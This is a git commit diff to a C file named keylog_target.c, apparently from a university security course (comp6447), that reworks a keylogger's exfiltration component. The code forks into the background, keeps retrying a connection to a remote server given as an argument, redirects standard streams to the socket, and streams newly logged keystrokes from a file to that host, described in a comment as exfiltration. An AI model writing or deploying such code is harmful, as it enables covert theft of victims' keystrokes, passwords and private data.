67e8914679273947380fed60e1aeab292b52a81c
comp6447 <wezham1@gmail.com>
2019-08-10 20:11:26 +1000

    should be working

--- src/bin/keylog_target.c
+++ src/bin/keylog_target.c
@@ -13,10 +13,12 @@
 
 int attempt_connection_to_server(char * remote_address);
 void read_and_write(int socket_fd);
+FILE* open_keylog_file();
 
 int main(int argc, char** argv)
 {
 	char * remote_address;
+	int pid, sock;
 
 	if(argc == 2)
     {
@@ -28,74 +30,79 @@ int main(int argc, char** argv)
         exit(1);
 	}
 
-	int sock;
-    while( (sock = attempt_connection_to_server(remote_address)) == -1)
+	pid = fork();
+    if( pid == 0 )
 	{
-		if(DEBUG)
-			printf("Sleeping\n");
+		while( (sock = attempt_connection_to_server(remote_address)) == -1)
+		{
+			if(DEBUG)
+				printf("Sleeping\n");
+			sleep(POLL_DURATION);
+		}
+		dup2(sock, 0); //stdin
+		dup2(sock, 1); //stdout
+		dup2(sock, 2); //stderr
+
+		read_and_write(sock);
+	}
+	return 1;
+}
+
+FILE* open_keylog_file(void)
+{
+	FILE* fp = NULL;
+
+	while(fp == NULL)
+	{
+		fp = fopen(FILE_LOCATION, "r");
+		if(fp == NULL)
+		{
+			if(DEBUG)
+				printf("CANNOT FIND FILE AT LOCATION WAITING A BIT\n");
+		}
 		sleep(POLL_DURATION);
 	}
-	dup2(sock, 0); //stdin
-	dup2(sock, 1); //stdout
-	dup2(sock, 2); //stderr
-
-	read_and_write(sock);
-	return 1;
+	return fp;
 }
 
 void read_and_write(int socket_fd)
 {
-	int pid;
-	long prev_size = 0;
+	FILE* fp = open_keylog_file();
 	char *buffer;
-
-	pid = fork();
-    if( pid == 0 ){
-		FILE *fp = NULL;
-
-		while(fp == NULL){
-			fp = fopen(FILE_LOCATION, "r");
-			if(fp == NULL)
-			{
-				if(DEBUG)
-					printf("CANNOT FIND FILE AT LOCATION WAITING A BIT\n");
-			}
-			sleep(POLL_DURATION);
-		}
+	long prev_size = 0;
+	while(1)
+	{
+		if(DEBUG)
+			printf("PREV BYTES READ=%ld\n", prev_size);
 		
-		while(1)
+		fseek(fp, 0, SEEK_END); 
+		long file_size = ftell(fp); // Get file size
+		long bytes_to_read = file_size - prev_size; // Get current file size - last file size ? anything new .. 
+		fseek(fp, prev_size, SEEK_SET);
+		
+		if(bytes_to_read > 0)
 		{
 			if(DEBUG)
-				printf("PREV BYTES READ=%ld\n", prev_size);
-			
-			fseek(fp, 0, SEEK_END); 
-			long file_size = ftell(fp); // Get file size
-			long bytes_to_read = file_size - prev_size; // Get current file size - last file size ? anything new .. 
-			fseek(fp, prev_size, SEEK_SET);
-			
-			if(bytes_to_read > 0)
+				printf("BYTES TO READ  =%ld\n", bytes_to_read);
+
+			buffer = malloc(bytes_to_read*sizeof(char));
+			prev_size = prev_size + bytes_to_read;
+			size_t result = fread(buffer, 1, (size_t)bytes_to_read, fp);
+
+			if(result != bytes_to_read)
 			{
-				if(DEBUG)
-					printf("BYTES TO READ  =%ld\n", bytes_to_read);
-
-				buffer = malloc(bytes_to_read*sizeof(char));
-				prev_size = prev_size + bytes_to_read;
-				size_t result = fread(buffer, 1, (size_t)bytes_to_read, fp);
-
-				if(result != bytes_to_read)
-				{
-					printf("error\n");	
-				}
-				write(socket_fd, buffer, bytes_to_read); // Write new shit to the tcp buffer to exfil
-				
-				if(DEBUG)
-					printf("%s\n", buffer);
-				
-				free(buffer);
+				printf("error\n");	
 			}
-			sleep(POLL_DURATION);
+			write(socket_fd, buffer, bytes_to_read); // Write new shit to the tcp buffer to exfil
+			
+			if(DEBUG)
+				printf("%s\n", buffer);
+			
+			free(buffer);
 		}
+		sleep(POLL_DURATION);
 	}
+
 }
 
 
